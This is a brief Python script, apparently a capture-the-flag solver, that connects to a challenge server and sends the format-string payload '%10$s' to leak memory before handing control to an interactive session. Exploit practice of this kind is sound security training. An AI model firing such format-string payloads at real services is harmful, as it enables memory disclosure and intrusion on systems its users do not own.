#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

host = args.HOST or '0.cloud.chals.io'
port = int(args.PORT or 12655)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

sla(b">>> ", b"%10$s")
re()

io.interactive()
